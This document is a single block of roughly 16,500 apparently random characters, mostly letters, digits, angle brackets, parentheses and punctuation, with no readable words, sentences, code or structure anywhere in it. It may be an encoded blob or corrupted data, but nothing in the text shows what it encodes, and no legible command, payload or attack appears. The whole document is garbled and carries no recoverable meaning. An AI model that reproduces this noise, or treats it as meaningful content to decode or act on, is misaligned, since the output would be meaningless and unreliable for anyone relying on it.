RP8crII-tI3SI4> -_84c88r(11t>tUvcS(-Ir>r(U4rDvU cEtccD 1r81ttvc8 8r8c18vrU1Stv>Utt-h8(4I1I>U->8-( S4v(z>IU>SDtD,-cvD c->c1(S4vD 1(18tZctIUItDttWcvI4I1Drt1(SWc*SIvUrcr8ctDSS8v0 I)t4S18>vUIS>>- v9!4(I(441>---vIDFU>v1(>4U}I4cDDtv8v Dr1tDU4cI 4rvc48-r>1UtSIKt-S(8 z(I1>D->8c(S4884{rI>>U-SUc-4v1>4-Iv>(U4SD4U c>(441D>1t1>tUc8 8rtDz>8SU DtvSI8*r4114SI-ttSc84r;I>tIU88I(U-vvS(0I4>11U>tU8vtD8U(v4 84>DUUS>vU4c(8-r(11tDrS1>t SO 48r8SE(1D> -SI=>IS18>AU8>^c4S>(S5v((-4-D>-t - S48D>U44UD-Uvc  5r8D1tvcU SrvAva 1-tRS( I4v1t>S8 14>TS>8UjSvDV8ItD /14%>U-SvvU-v4(4II>IU84tDvU cM(441D>cUtc vrD1&U4c1-8SS81rtIw>vSI84(8SU8r!vI >:DDtI-(vSZr4UD--vv8>1UBvU(S4v< 4c1 S1ct DUScc  roD4t8c>8trS1vt D t8S18S+(1ttc-S8cZ Dr>4--vULcIt>c=448>>-UvSctcl((4VDU-rv1D-Uvc  t44D1U>D-Uc8t8erc1Dtccr8DtSSr8 X514481r>1vt81=DI1> -48r(S-tvv( 4<>4-1v>S( SDvUUc&(441(t4->8UccD 4U4S1 >rU1SI1I-tIcr8>OtI(t>cSv(xr4 U1SDv>(>-vv-(_I4>14>>t-rcS cUbc-(14>DU1tD1U8S (r4r14UISU1vtDSb 4r1( rI1->g-S8U4B1I>1mUID>v- vXc8c Lr4SD>(-4 D#-4v1(>4UDSUvc  S44D1U>tDtcS  Urt1cvUrD1UtS-S>r7!14t1tv8UXSIvDv4I84wII>>4-Svv( jeD4-1vD(U4-DvUtc08mDSD>UDcS8>r 1/U4c1v8rU1-tvSc8PB)11D>>I8SucI >(S4vrK>rU4D-vv8(lIr>1UtvU8S tD U(v4(I4>ISUS-vS-rmDrU1cD Urt1vD -V 4rI1>ttSSc>z I)1SS18DoUIU>v- v/*4r->>-UvS(v4 D -4c;SU4tDSUvSD (4rD1t1Ic Srt1 D>c4 1r>I>>>Sc8UkTIvt1S>8U Sr(> -S84( I>Dh-SSv (4nDv-1cZ(Ux4Dv> Sv(4r D>U4cSvtr 40t1c18KrU11tv-t8K(44-t>S48Sg>I 1SS481NIIU>1-vvt(EI4>1->S8(S4tD Uwv4 84>D1Ivcc  rGIcUIcD U(SJtt S> 4*c1>1(SScvc-IP>US1vv5UID>vUvcSR44->>-4vS(v4 IeUvv1 c4U1(UvSU s/4I U>S8 Srr1 >8c4v1PS1U>(Sv8I_)rtt1U>84uSIr> -D848cI>1UUUvv(I4_Dt-1vr(U4S( U8c>(4rSD>t8cSvv8-12tUc18vrU4ctvUU Ir4ISt>U18S6cI 1-S4v&cUIt>S-vSS(zIr>1-4tS(-4vD t-vr(I4>1>cwcv 1rl41U1c> UrS1-t S> 4r11>tUSScvv-I!>US1v8QUX >vt Uc;44S>>U vS8-4 IS(>v1 v4U1IUcc8 ?m8D1U4>S -rv1 >-cr Ir>1UrvSv813/14t1S>8U 1Ic> ->848>I>>t-S- ( 4vr1-Iv>(U(vDvU8c:  8>DDUUcS8Dr81(U4S4>-rUIytv-I8Gr411>18 8SRrI DIS4819>IUD -vv1(w4/>1-DvU(S vD U>v4(14>DtUScv Srw1tU1c> UrU1vt -S 4RU1>tUSS8Ua Iy> S1v-bUIS>v-Sv! 444>>USvS(U4 1v-4S1 N4t1cUvcD Q(-D1>>-( S.81 trc48(r>1UtISv8rLJI1t1-t8U S4t> -484(TI>D1-SSv  4ODI-1c8(U:rDv> c4(4rDD>t-cS tr 1Tt8c18-rUIvtv-(8?(4((t>-S8S#UI DvS4c1(FItDc-vvD(jx->1t>ci(Sr8D Urv4 (4>DUU-cv rr#11U1St U(S1ct S4 4}^1>>1SScvVvIW>IS1v8sUrr>vt c z44D>>U-vS(t4 DBU(v1 -4U1vUvS( <r4c4U>Sv S(v1 tIc4c1rI1U> Svvvg?I4t1t>v53S4{> tI84(tI>1UU4vv(r4ZD--1c4(UrSDrU c1(4rSD>tccS8vYc1lttc1 4rUI tvt v1r4I-t>-v8S cI D?-S81(vIU>>-vvI(Rr6Dc-Dc8(S4>D U0v481r8DUt(cv IrB1cU1S18SrSI(t U  4r11>tU-U8vTIIp>DS181#UrSDt- vDK44->>USvS S4rD)UDv18v4UDSUvc  S441-U>Sc SrS1 DPS4 1mc1U>(SvvC__4^DrS>vcCS41> -p84J1ID>UU(vv(r4JDY-1S>8.4SDrU cD(4rcD>t>SS vrr1E>>c1 >rU1S>SS 84r4ISt>SU8Sbv4U>_-D81(UIU>S-vv  >I4D-->vU(S4cD U2U4(1rcDUUScv 8rgD4tvc>8vrS1vt S  4r111tU-88v/ IW> S18>(8ISD - vR744=>>tUvU(vr(DgU v1 44UISU>c88_441cU>U( S(vIrt=S4 1%>1UtDSv8 f414>>S>v-uS4v> tjc-E14t>U->vv S4G14ttv> U4SDIU -t(4?1DrUUSS v* 1Yt8c1 >/S1S> S 8rr4I1t>UU-Ddv4(>d- 81(4IU1S->v8 QI4Dc->-((S*vD>Udc4(1r>DUUDcv  rvD4t>c>8-rSIvt Um81r1IttUS>8v(SI_D4S48>(UIS>I- St64r11--UcS(vr D<U8v1(>rSDSt c  r4411U>SU1Urv1rt?-4 1%U1U1S-18 0I14>4S>vUMSdv>8-VvDp1b->UU8vv8 r >4U>v> (4S1UU SP t411-UUS9 v!C1yt4S1 >#v1StUS 8Ir4r1>cSUv 0vI4>6Ur81(>4->S-rv (vI4DU->c>(r4cD4UYcv(14>DU>SS8  r1D4tUc> rrSIS>SSO81r141tUSS8v, IIt4-U8>(SIS>S- Se(UI1DS-Uc (vr,D?t7vI(>rSDSt4c  ,44D1>(cU8 rvIKtWS_ 1(>IUtS-_8 .114>>S>v> tIvDe-6cSb1I>>U-Sc>( 41>4U>v>(>4SIvUSc+ >411SUUcr vavIvU4S> >(v1StvS 8;(v11>tSUv(6vI >+S4vtG>4S>SU8v (_I4>1U(vU  4vD UHvr(14>rUUSSj  rkD4UIc> Uj-1vtrS% 4r111tUSS8D_ I4t4S18>o1IS>v-vvu(II1>>-Uv>(vn Dt-4c1(>41DStUc vmrvDItDcU rrv4Dt&-48Ur>IttS-c8 &c14t1Sr8U(cIvD -}vr^1r>18-Scv( 4v>4t.v>8Ur1Dvt8c, -4148UU-S 1r I(U4SI >rI1StvSS8;MI11>>SUv-5vr 4cS4v1o>I1>SUUv 8_4v>IUDvU(r4vIDU.S4 14>1tUSSc  rcD4U1cr Uzc1v> SW8rr14>t>SSvvn Ivt4U28> U48>vU8vm(-I1I8-USS S4 1(-4cI(>4IDSUvS( *rID1t>cU8-rvI 8 c48>r>4UtS-88 8&I-t1-U8U(UIvD -#S4 -I>DS-S-(( 4I>4t1cU(UrcDvUDc<8 411>tScS8 r 1>U4SD >dU1UtvSr8{X 11>USUSS(mI >IS4vU}>r(>SUvv4(!4>>1-4vU 84v1vUtvr t4>D4UScv  (P1tU1S- Ud81vttSjvbf(1>>-SScSz ITt4S1vIyU48>vU(vs(oI11>USvS (4 DI-4c>(>r>11UvS( A)UD1U>cU Sr-1 tIc48Dr>1>tSUvv b0IDt1--8U(vIvDvt884(DI>1x-Svv( 4_D -1c-(UrcDvUvcm84r;D>tccS8(r 1tU4S488rUIctv-48Ar411t>-I8S(vI >1S481}>IU>>-vc((%44>1->vU(Sr4D UIv4(14>DtUScvS r=1DU1c> Ur-1vt -^ 4a>1>tUSS8Sd Ix>TS1vtRUIS>v-SvP{44->>UUvS(v4 Dv-4S18v4U1-UvcS hb D1>>c4 -6S1 ttc4ccr>4U>lSvvvOW4/t1Sr8U/SIt> UF84(II>D>-SSv(t4ADr-1v4(Ur>Dv> Sc(4r4D>t(cSvIr 4*tcc181rUIUtvS-8fr44ct>-U8S(cI D S4c1vrIUD--vvS(6r >1t>v4(-rSD Utv4vc4>IU> cv8vr=I%U1cr UrSIvt -3 4RI1>>>SScv#1IG>rS184GU4>>vt cSP444>>U(vS8I4 ICUtv1 14U1UUvc- %441UU>SU S;c1 > c481t11U>cSvc ,CI4t1t>cL{S48> U 84(1I>IU-rvv (46ID-1c-(U<S1tU S*(4rcD>t1cS8v0D1XtIc18vrUIStv- vDr4I>t>S18S(8I IQU-81(UIUD -vc8(#441 ->cc(S4UD U4v4 4r8Dttvcv UrjD4U1->8UrSI t S4 4+81>>>- 8v( Ii1PS18><UISD4- v4}441>>->vS8v4rDGU1v1 U4U1vUvSv t4411U>-  Srv1 tmSt 1;U1U>SSv8v2P44>1S>vS+S4 > -484(4rI>UUSvv >4#>4-1v>8c4S1 U SK(444D>>Uc- vg{1Jt1c188rUIUtIS v_r44Ut>SU8S<v4->Q-r81(-IU>S-vv (cI4D1->ct(S4vD UAc-(1rUDUUScv 8rGD411c>8SrS1vt S( 4r11DtU-c8v6 Ih>)S18>(UISDv- v{{44!>>-Uv-(vr8DV-4v1(44UISt>c 8 441?U>S1 S(v1Ut(-( 1_81UDrSvc C 14>rS>vDVSIt> -<c(J14D>UUUvv c4g14-Iv> >4SDUU Sv(4f1DrUUSt vrD1QD-c1v>rr1S>-S v8r4I(t>SU8UCv48>BU#81(IIU1SDtv   I4Dh->c1(S%vDUU(S((1r8DU>rcvv r(D4trc>8DrS1tt S:vSr1IDtU-U8v(cIRD4U(8>(>IS>U- cv_4r1Dc-Uct(v4DDF>-v18>rDDSt-c 88441(U>cU IrvI8tn-& 13I1U>SzS8 (u14D1S>vtNS;vDt-sv4V141>UUSvvv 4v>4U1v>vc4S1(U -M8v411DUUcr v{S1Vt4S1 >3U1St4S v(r4I1tDSUvc;vIS>/-4818>44>SU8v (1I4>4->cU(t4v1?Ugc (1rtDUtUcI 8rrD4t c> UrS4v>cSi8Ir1IttUSI8v(vI>t4-I8> >IS>v- v_ vI1Dt-Uc-(v4vDet4c-(>r-DSt8c  44414t4cU8-rvI1t;c4 1r>I>tS-88 ((14t4S>cU(SIvD(-:vI;14U>UUUS-( r(>4tvv>(U4SDvt-cZ I411DUUcU v( 11U4SD >y-1StIS v k-11>DSUc gvI >YS4ccb>4>>SU v (+I4>1UtvU -4v1vU7v4(14>I(USS8  r%D4UIc>8>1:1v>(Ss8 r11>tUSS8-K Irt4S18>.UISDSDcv((II1>D-UvS(v4 1v-4cD(>4tDSUSc vXrtD1ttcU8crvr(tm-481r>I-tS-88 _D14> U 8U(cIvDt-(8r.1I>>U->t (84V>4t8vD(t4SIv1-cX I4118UUU  v( *cU4SD >H-1SD-S cSrr11>tSUvIbcI8>?t 81Z4 S>--vv  -Ir>I->vU-v4v1(UNv4(14>DU>1r9  rrD4D>c> trSr t Sv-1rI1>tUtv8vL8IL>v-48>/IISDD- v(F4I4>>-1tv(c4 D!tcv1(D4UD1tSc  A441tU>ct SrS1 tv>1 Ir>1U>8Sv88Q/14QvS>8UpSIc> -#84E1I>>U-Svv(>4L>4-1v>(44SDvU t8UIc> <r(DI v}Z1eU4c1-IcI8 rt1c>v(4(tNtIS>t-U8-( S484_>IU>SI8Ut(R4->1->vUc-ct S4rS4S vD >r8cv Sr*D4U1I(Utcr8Ut S- 4r11>rr1D>USt8c914 8>*IIS>v- DR-(8I(S4vvS(D4 D{-4trUtc- v4U1(UrR8D1U>cU8U-(1 tbc48(r>1UtSSvrD9W14t1SD8UhUIv>Uvt84Q1I>D1-Svc( 4F>4UHtU(t4SDvtScn(r4111=ccS vr 1SU4c1 >rUUrtvS 8grr11t1SUcSvtI >gS481l>It>StvU-(kI4>1->vU(>4vDUctv4(14>DUUScc  rND4ty>U trS1vt Sy rr1I1(cSS8vk I8t4S18> U(D>v- vl%4I1>1-US1(c4 DL-4cD(>4tDSU1c  v81DIU>cU8crv18tuS ->rD1UtSSv8 N(14>44-8U;SIv>t-<84h143I(--vc( 4}>4-Iv>(t4SDv8>cj(441D>UUcS vr 11U4c1 >r>1StcS 8vv11It>SU8SkvI8>WS4>vC>IU>S-cv (nI4>1-DvU(S4v4(UBv4(14ID-D  4S(4S1U- tt Us(1vt Sh-cS(84ID14tIS48v(sI(>UmUID>v- vicDvD+4IID (v4DDa-4v1cDcI >r8- SSvr 4r-cU >rv1 t_D t(- 81tSS18 y71441It>DSrvUZDIr>1b14(>U-SvvS v1{rrc>rU>ctDvU-cY(44124r(1>tac-184-?>v(8Uv-1Svt4rr4Ict>SU8Sv18-*(I>DV- (>C-4Sv  mI4>1->tdUDc((844DIUcv4V>rc18tSv9(rr414 DUOr-DI4;r181(IIUStUIDn4-I44IS14r(c>v-SvMz4I1((ItD8-t4 D--4v1(> I v4cDvU1c8 uU>cD Srv1 ItI(SIr>I(tSSv8 v88SrII1ttStvUE-4 v(c14 8>cSS48I8141-rI>v1S(Iv8U>I-  >DDUUcS8 r 1ZU4> t8SS >I>1D> -(v}IIILtr-#8S>R- 81/>IUr8Ic>D-4I4D(->vU(Scv(84t1!Ur4IDUUScv  r5D4-1tt UrI1vt SWU(SD8tTS1>>8-(I8>c-C cv-t8> vc-I(( v> cS c(v( 8(D4vr8vt2v A8r(>( 1r1U>c> Srv1 4r>c 1nU1UtSSvUcSc8>G(1I>1 S (((I4D(Ux8r(>-tvv( 4J>4-1v>(U SDvUUc_(441rIr-1vU>cD -U4S  >rU1SI->U> cr8trrSU8>{vI >O1(>cUv8I>t-vv (JI4>11>11cS4vDIU:v4(18S -4tDcU4v_ >4II8UISU1vtSSd 4r1v(rt1r>U0c- c tvttI>vDr-8Fvl((I1>>-UDv-tctD}Ucv1(>4Uo14tDctvcI 4DIcU Urv1 tQD -1r>1rtSSv8 S-88(ZI(tI-vv>> -t84K1I>(r4cDS-Ic8(4II>I-I4SD>U c:(4 r Sr(DDt SS1Ct-c1 >rU cr8>-t4S88t081I>tTvID>nS481c-8tHI4 >DUvc8(GIrvU(14vD UP>I-D8-(t4r1 U(r;D4U1S1DrrS1vt -- 4r11>>>SI8v/8Ih>1S18>oUrSDI- v(?4II>>>8vS8v4UDf-rv1(D4U4cUv-  >44DIU>ct S (1 D5Sc 1rD1Ut-Svc4_#44>4S>8tCSIc> - 84/1) >U--vv(v4W>4-1v>884SDvU cV(444D>U1>v cr 1}4>c1 DrU4S>vS 8cr4IXt>-U8S(St1>i-c81jIIU>S-vv  tI4D(->vr(S4SD US -(14rDU4 cv 8r{D4U1c4-Sr-1vt D1 4rI1>DU-S8v=-IA> S1vr=U4US4- v-*44S>>-UvS(vrDD0U8v1 (4UDUUvcUrt441(U>Dv Src1 t=c48evU1ttSSvU43,1rt1U>-IbSIt> -v84(SI>1Urtvv(-4wD8-1S,(U;S1 U cc(4r(D>tdcSvvrI1Qt8c1 rrU1Dtv-v8rr4I t>t(8SPvI D -S81((IU1--vv (?r4Dt->vr(S4DD >-v4 4_JDUU4cv8IrHD4U1S144rS1It -1 4r11>>>-U8v_1IK>>S18>OU4U1:- vDL4II>>-UvS Sr(DFU>v18v4UDSUvSv I441tU>Sc Srv1 > Sc 1%U1U>tSv8 ws4^DUS>v-bS41> -d84(4>v>UUSvv8U4u>4-1c14 4S1cU ct(441D>t>UD vCv1_>}c1 >rUIUD(S v8r41It>SU8Syv4I><-c81(IIU>S-vv  cI4D ->vU(S4cD >SS8(14rDUD cv 8rhI-U1c4-Sr-1vt U1 4rI1>t1Dv8cz IAr>S18DhUrS4t- vS944x>>U8vS8v&8D(Uvv1 N4UIUUvSv  4418U>U/ Srv1 DKSI 10(1UtISvctiu4#>cS>vZVSr8> -p84(44v>U-rvv8(4a>4-1c1 U4SD4U SU(441D>UUS- vrt1etUc1 1rU11S(S 8Sr4*8t>St8SbDI >vD18IW>IUII-vv8(54 r>-DvU(Sv2D U(v481 rDUU1cv Sr_1tU1->-IrS1>t SS 4p 1>>>-r8v0tI/>1S18>&UrS>1- v-x448>>-rvS8v48DHUcv1 (4UI>Uv- 8t4418U>cr SLc1 Db-U 1%(1UtISv8IYl44D-S>8r,SID> -S84Y18U>t-1vv(U4EDc-1S>cI4SD>U cS(4(>D>>4US crU1y4>c1 DrU4ttvSS-4rr11t>1v8SicI D 4D81()IU1D-vv (^I4r8-Dv4(S4cD U(v4 4rDDUU1cvvDrhD4U1->8rrS1Dt Sv 49-1>DUS48vutIA>cS1cDRUISD-- vUV4I1>>-UvS(v48DYUcv1 (4UD4Uvc  (441 U>c> Src1 > t- 1RQ1U1+Sv8 hG14trS>84)SIc> - 84 148>U-1vv(U4f14-1S> D4SD>U cS(4rGD>U4S  vrU1L4}c1 DrU1-tvSS-4rr11t>D>8SxcI >vD18I;>IU* -vv8(Yr: t->v4(SO(D U%v481 rDUU1cv UrbI1U1UR trS1>t D- 4rI1>D(SS8UcWI(t4S1t(MUI->v-SU4_rI1>>IvvS(c4 I}18v1 :4UD>Uvc1 _L4C(U>c4 Sr>1 trc4c rD1Ut1SvU4&#1rt1-48UG>  >8-F84SUI>>t-SvUSJ4(>4-1UI(U4-DvUUS (441D>t cS cr 1 U4Su-Urt1StvS18zrr11t>I}8SivI >(S481!>IU>S-vv (erU>1->vU(S4UD Ukv4S18tCDI>cv Ur<D4U11nt-SU8(r8Iv 4. 1>tUSS>--Sv K-I>>(+UIt>v- voS8v4(S-Uc (v4 D,1(DDUUc1(Dr 1SvIv 8cr>DI Sr>1 tdc4t(S- >rD1U>cgAI(t1S>8U-tvI(x-hvS01I>>U4>D8Uhcc(DI4>rU>4SDtU c+(4vr trv1ctSr 1vU4c1 >cr -?(1-8P%v11t>SUU8StvSKUII>5o>4v>S-vv -Uc  Y4>>-UUvt 8rcD8Urc4DUrVcv  r<1DtStr>scD -%-IvtIS4=vDUUD>-JrI>4D1I>>v rS1t4cvI(U8G(84c>Dv4/ Icr(ct v8U  4c1DUcS?I1IUDtt8ctr1DBU8try-I I>1I>c-%8>rI48cUcv8cYrIc-U 1rr(DU8v4S v1zrrc>rU>^Sxvr(18U-Sp 8r-1vc4( 4cK(St8v8D8 rI1-t4- 4148>1-H vr-(8-DvSb>4U>S-vv c-8r(tIrSUcrc (U4r1KUtvD 14r18tarj1UU1c> Uvx(-4(>4-8S> IJ-1>tt} 4Jt4S18>StvS(vI4>t-(8I(44(DcU (((>r(DDUU4U1(Uvc  i8S8Cr41U-tct8v,S1-Urcr1Ut4Sv8 Gov TDII>1-U8I(TI-84(SI>>U-SUD--cvM(4(D1U4vr(-4-c0 t41D>UUD>UtSc 8j;1ct>S1 ra8IQ8_R 11t>SUUvSc8r_cS4v8V>IU>S4S>-U(c8((4ID1(S4DD Uwv4Svvr(t4>DttvS81(U1c> U-S8> 1D1Srr11rtUSS8v-S8t( IUtrlUI>>v- v+cEvD:4r(tI(v4 Di-4cv(>4UDSUvc  (44D1UDcU -rv18tFc4 1r>IStSSS8 ;O14trS>SU(tIv>v-/c-<14U>UUUc(( 48>4-rv>(U4SIvtUcz (41DIUUcU vMvI,U4Sh >.c1StvS 8;WS11trSU8SivI >+S4849>I4>S-cv (,I411tvvU(14vDUUzS8(14>(SUScD  r D4U1c> UcI1ct>S28(r11>tUSSvvZ Itt4-!8>eUISDS--vl(UI1D1-UvS(v4 D(-4c-(>4IDSUvc  lrrD1tvcU Urv1vtuc4U8r>I8tSS>8 X914t1-t8UTtIv>I-Hvjx14>1 -SvS( rv>4-rv> >ewDvUcco S41D>UUSU Ir 1vU4-v >rU1Stv-(8Ob(11t1SU8UFv4 >IS484N>4(>S--v (C> >1-DvU(U4vD8ULc4U44>DUUSc>  r(D4t4SS tr-1vt1Sb 4r14>DsSS8cg I(t4-r8>(>4t>v-cv?(rI1>>-UvS v4 D(-4vr(>4>DSUvS( brWD1U1cU SrvIv>cc4 rr>1rtSSv8 dS4(t1SI8U UIv>8-f8r71I4rS--vv( G >4-Iv>(18vDcU cuc*41DDUUSU>(r 18U4S8 >rU1SDv8S8!/(11tISUv1kvI D(S4v5n>IU>S-Uv (+rD>1-rvU(I4vD Uzc48c4>D1UScU  rcD4D1-c Ur>1vtISo rr11>D=SS8t* Iyt4SI8>8U41>v--v?(8I1D>-UcSc14 Dv-4S8(>4IDS>vc- {r8D1UDcU8crv1 >tc488r>1UtSSv8 )*Ict1Sr8UjIIv>v-Bv4((I>>1-Sc4( 4c>4-1cr(U4tDvUvcW P41D>t cS Sr 18U4c1 >r11UtvS 8gcv11tDSUvUU(I >8S4c B>IU>S-> t(O4(>1DhvU(-4vD8UEc S>4DDUUSU>  r(D4t=>U trS1vI-ST rr1I1(cSS8-) 4St4S18>?U1z>v-Sv&n4I1>4-UvS(I4 Dc-4c8(>4UDStvSI ;r D1U4cU Drvr >Sc487r>I8tSSc8 TbIUt1Sr8UdSIv>8-,S4((I>>I-Svt( rE>4U1S8(U4>Dvttc; 841I>ttcS tr 1(U4SD >rUI4tvSt8&r411t>SU8SxSI >cS4v8T>I>>SUvDv(B4 >1tvvU(D4vD 48vr(r4>D>UScS  rOtUU1c1 Urt1vt So8 v>1DtUSSU>K I(t4-4D-)UIt>v-4vKK4I1D6c(vS(-4 FS-4vI(>4UDSUU>V (44D147cU -rvIv*Ic4 rr>IvtSSv8 pgDUt1S48UGSIv>S-+84(rI>>I-SvD( 4p>4U1cU(U4>DvUSc{ 8414>U4cS Ur 1DU4cI >rU11tvS-8<r411tDSUSS(-I >cS4v(A>4U>SUvv8()4 >1t(vU(D4vI tvv4 (4>DtUSS8  r3IPU1S( UrS1vt Su 4(U1>tISS8DC I t4-1>1EUI>>vU1vT(8I1>>IDv-(-4 D -4v4(>4UtFUvcv gr(D1U>cU Sc11 tjc4 Ir>1UtSSv8 EN14t1-88U#SIv> -v84k1I>(rI->IUS4&D8-1v>(UcS(-48D1U>411IUUcS v888c^ 1Dv>v> Dr4I(ttS141I4II>vSD8-grI181s4IU>S-vDS-(c((-->v4(S4vD 18DIU>cX (4Icv trsD4U1>>tvc- -r->tt r1I(tUSS8vSt8c( I8tr-Sv1>v-Svpf4I1((ItD8-t4cDk-4t>8_((4vS(tv8c44D1U>S>>8rv1 t#S  1r>1UDS>t8 pg14t1S>8twSIvSD-_84o1ID>U-Uvv(UDt>4-1v> 14SDcU ch(4r7_UUtcS v!S1ZUrc181-c1StvS 8-r411t>SUrrXvI >:Sr8121IU1SDtv (*I4>1->vI(Smvr-U6v4(14>DUUtcv U1tD4U1c> UrS1ct S< 4%x(UttSS8vj IntrS1v1UcIS>v- vU,4I1>>tUUD(v4 D:-4v1 R4UI1 &c  P4411U>ct SrI1 tv>1 Ir>1U>SSv88}fI 4>SD8UXSIv> -(84(4c->U-Svv(v4Q>4-1v1cH4SDcU c/(441D>UUS  vr 1%tkc1 DrU1>4 S88Tr411t>St8Siv8>>xS481*DIU>S-vv ((I4>1->cD(S4vD U9cD(14>DU1>1tt;c- 8rD1UStct8UrD1rt1rr1>tUSS8vx I/U4>D8>i1IS>v- tvU-v1Fr-UvD(v4 Do181 -rcS >Uvc1 +44D1I(DIt>v- -h IvtccI ItSS48 Wj144 I8>>SD -j-4 Dv-(v1>U--vv( 4gDU-1v4(U4SDv1tDcUDcrD>UtcS vr 1tt(c1 >rU1StvS 8Y8411>_SU8SYv(8K84 >c-tvS>SU8v (kI4(dIDD1--8S(-4IDItVvrrIr1Dtt{SvD4tUc> UrS(Dr81t> v 8tV>>tt1SD81x S1vS%UIS>v4cDvSrv4(4D1DDU vt(c4ID>(>r DSUvc S Sj c44DrUDv  -xvt6 1/D1UtSSvUvSc84pUI8tDS-vU&-Ivt(UWvt(>I->D--4jD--1v>(U U trD>vU-vr c4I1> vrS1_U4c1t(ct88rtS 8Sr411t>II>v-v8868ItSrM>IU>S-vUS((I4>1->vU(-4vD tDv4(I4>DUUScS  rxI(U1c1 UrS1vtcS*c4(S1>t>SS8-H IUt4t1c&mUIU>v-Svg2rI1I>U1vS(S4 DD-4cI(>rU1UUvc8 grTD1U1cUcS8318t(c48Sr>1rtS-v>vmy14t1S18U9-IvDv-t8r,II>D>-Svv( sN1U-1vD(U4-DvU-ch8*4rD>UDcS8vr 1NU4c1vcrU1-tvSc8:WX11D>-t8SHcI >(S4vtG>4>D1-vvc(&4I>1->vU(S4>D U(v4(r4>D>US-v8 rKDrU1cD Ux81v>vU8 4rr1>>vSS8vF IE>0S18D0UIt>v-vvL 448>>-tvS(c4 DS-4c4  4UDtUvSc p44D1U>S( SrU1 t^c4 1r>1U>8Sv8cPAI t1S>8U:S4I> -(84W1I>>t-SvvcS4(>r-1v>(U4-DvU S{(444D>UUcS Sr 1m> c1 IrU1StvSc8* 4IUt>SD8Sm-I >US4S1  IU>t-vvS(*Ir>1>>c4(S4-D UDv4 I4>1UU1cv vr!1)U1cI U Sl,t8S  4_S1>>(SSvv-vI*trS181eUIU>vUvvtorI4>>U>vS(v4 IxUcv1(14UDUUvc- 37f1UU>c1 S_v1 tac4 1r41UtUSv8S:;I=t1U>vS#SIS> - 84(tI>D>U-vv(S4EDI-1v>(U4SDrU c (4r)D>U>cSvvT 13t*c1 1rUI8tv-vc8r4I<t>-v8SavI >R-t81M1IU>>-vvv(Mr4D1->v>(S4SD USv4 44rDUU>cv8cr)D4U1c> 4rS1tt S( 4r11>tU-v8v,SId>8S18>wUISD>- v 24I1>>-tvS ScrD^U&v1 U4UDSUvc 8r4rD4U>ct Src1 t?1S 1r>1Ut-Sv8 AH14t1S>8UOS4M> -a84)14(>U-Svv-tvc  48>rUSc1DvUUcC(441 8rDD1UIc4 cU4-- >rU1SIUIDt4cr8tO81DcSv1v-e U4-I-1v((tItS c8cO(D4IDDUcc>(-r v4 S4>DUUS1(U8cD 8r 1ttvc> t%vSd8(r11>tU>>tI-cI0>SS18>WU8r(-IU>r->v5Yr4>vS(>4 DE-4UrUtcS(14IDt HrUD1U>cU-WS-8(r4>8t>cI8-r>1t8 _c14t1S>SS-,v-((I484g4I>>U-S>8ct4CD--1v>(UcI S4D1vU8c  8rvDD vQ41oU4c1S4-(8vrc1rttS(414 IItU v(8( I->rSrrU4t4SD(U8c((DrQ>IUU(8IUUxv4(1r18cUScc  r>D4U1c>vU8D1vt8Sm rr11rtUS1?I: I(t4-(8>htIS>v- vvc1II>>-UvD(v48D,U t>(D4UDSt(c  (4414L-cU -rv1Utjc4 1m1t tSSS8 d814t1S>8UStIc>8-Wv_P1I1>U-1 D( 4(>4Utv>(t4SDcU cvS14ID>UUS8 vr81X>nIt >rt1StUS 8mr4I4SvSU8U/vIc>)S481V>4v>S-cv ( I4>I->c>t84vD8UQcU(14>DU>Stt  r(D4UIc> IrS1>SDSM rr1I1tUS-8vQ I#> D>8D&UISDS- v(V44RrU-tvS(vz-D7-rv1 1ScDSUcc   44D1U>S> Src1vt+S> 1r>1UtSSU8 z814t1S>8U#S4S>4-9v L148>U-Svv( r(>4-4v>(>4SDUU c{ 141DDUUcU vrv1YtvSS >rt1SDtS 8(r41It>S1UvgcI >!t881yDIUDUr(v ((I4D-->vU(SrSSUUjc)(1rSDUUScv  rID4Urc> UrS1vt - v+r114tUSr8v^ I3t4U(8>^>IS>S- vv6444DS-Uvt(v4>D_-4v1 14tDSUUc  (44D1U>cUv6rv1St+cr 1r11UDS-U8 zv14>GS>8rRSIv>I-/v(?1I4>U-Svv( 4(>4-Iv>(U4SDcU c^US41D>UUc- vr 1MUrc1 >rU1StIS 8<r411t4SU8STvvS<(4(>-a>4t>S-vv c(c8 &4tSUSZc8(D44S4SEcr S4IDtt(c4D4ttc> UrS -Tv1cUr-6 rI1ID> St8cbII>8>zrIS>v- >--8cp((IIDvU>4 DS-4v1(> D cr DUUtccD1tScU Srv8cFvDrt4S4u1eDI ttSc8IX>SI8UNSIv> -F84(v(>>U->vv( 4) cIID8U14tDvU cX(441D>SUtc8Ur 1<U4S4>-rU1StvSS8nr411t>8(8SivI >(S484!>rU4D-vv (.I4>1-rvU8S tD Umv4(14>D>USc>rDrHD4U1SI Ur-1vt S?8 v>1DtUSSv-p I(t4-4D-}UIS>v-cvwx4I1>>t-v-(v4 D(-4vI(>r>88Uvc  ^4rD1U>cUvS8t1 tlc4 1r>IJtS-Sr1%/1rt1-88U&SIv> 1>8rE1I>>>-Svc( r D(-1v>(U41DvU ck(4zDDDUUcS cr 1(U4S4>-rU1StvS88sr411D>>I8S,vI >mS4vv_>4>-L-vv8(T4c>1->vU(SrZD Ukv4(44>DtUScU-<r(D4U1c> Ur-1vt 1U 4r11>ttSS8v! Ikt4S18>{UI4>v- vy^44H>>-UvS-Dv8(I48vI(D4UD4Uvc  s8  crIDtUUSo -rvc48Sr>1UtS>Dt--v (n(I1>4Sr8-W--6vcN1I>>U1SDg-8ct(844DI(U44DvU cocrS( 4r-t1UcSv IU4St >rU1S4v14t(--8(g1DDtt-S8D(:4 >rE>48>S-vv c1vImrIDDvSScA(8rtD8U4rvDUUScv8v>(D4U1c> trS1vt Ua8vr11>tUSS8v&SI*DiUU8>A>IS>t- vsX4I1>1-UvS(v4vDQU^v18>4IDSUvc  2441vU>-U 4rv1 tWc4 1#(1UDSS>8 <L14t1S>8rhSrvD>-y84*1I>>U-1vvv 4I>4-1v>(D4SDSU cE8>41D>UUc- vr 1ZU4c1 >rU1St>S 8Rr411t4SU8S;v8tY(ID>(C>4U>S-vv cUc8(tIDDSUcvI(SI DIUDc4EU4-1StSr21-U1c> U8t 1r8I Urcr84rIIU8vuIIXt4S1US--8t5cI4t%->8I 8IIDU(v4tDe-4v1S>cv(-rID-t S(D1t!cU Srv7cISI7UIS- ItISv8 2}4y(tS>8t_SIc> -584 1(r>U--vv(84dD8-1S>cI4SDcU c((4r/D>>UtD vr81eUrc1 IrU4SItS 8(r41It>S>8S(vvv>uSr81(KIU>S-vv 